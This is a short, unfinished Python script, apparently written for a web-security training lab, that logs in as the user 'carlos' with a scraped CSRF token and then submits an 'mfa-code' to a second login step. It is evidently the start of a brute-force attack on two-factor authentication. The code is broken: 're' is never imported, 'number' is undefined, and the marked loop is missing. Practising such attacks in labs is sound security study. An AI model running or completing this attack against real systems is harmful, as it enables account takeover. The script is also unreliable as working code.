import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
login2 = burp_url + '/login2'

session = requests.Session()


#loop start
response = session.get(login_url)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = match.group(1)
burp_data = {"csrf": csrf,"username": "carlos", "password": "montoya"}
response = session.post(login_url, data=burp_data)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = match.group(1)

burp_data = {"csrf": csrf, "mfa-code": number}
session.post(login2, data=burp_data)
